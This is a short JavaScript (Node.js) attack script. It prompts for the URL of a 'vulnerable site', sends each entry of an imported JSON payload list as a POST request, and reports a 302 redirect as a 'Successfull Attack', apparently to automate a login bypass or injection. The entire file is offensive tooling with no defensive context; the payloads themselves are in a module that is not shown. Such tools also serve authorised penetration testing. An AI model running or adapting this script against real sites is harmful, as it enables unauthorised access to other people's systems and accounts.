import { Payload } from './payload/payload.js';
import axios from 'axios';
import PromptSync from 'prompt-sync';
import chalk from 'chalk';
import { colorFail } from './utils/style.js';
import { colorSuccess } from './utils/style.js';


const prompt = PromptSync();
const url = prompt('Enter the URL of the vulnerable site: ');

const axiosInstance = axios.create()
axiosInstance.defaults.headers.post['Content-Type'] = 'application/json';
axiosInstance.defaults.maxRedirects = 0;
axiosInstance.interceptors.response.use(
    (response) => {
        return chalk.bgRedBright('Failed Attack\n') +
            colorFail('Payload:', response.config.data) +
            colorFail('Status:', response.status);
    },
    (error) => {
        if (error.response.status === 302) {
            return chalk.bgGreenBright('Successfull Attack\n')  +
                colorSuccess('Payload:', error.config.data) +
                colorSuccess('Location:', url + error.response.headers.location) +
                colorSuccess('Status:', error.response.status);
        } else {
            return chalk.bgRedBright('Failed Attack\n') +
                colorFail('Payload:', error.response.config.data) +
                colorFail('Status:', error.response.status);
        }
    }
);

const attack = async () => {
    // Send requests with payloads in JSON
    Payload.inJson.forEach(async (payload) => {
        console.log(`Attempting attack:\n ${await axiosInstance.post(url, payload)}\n`)
    });
};

attack();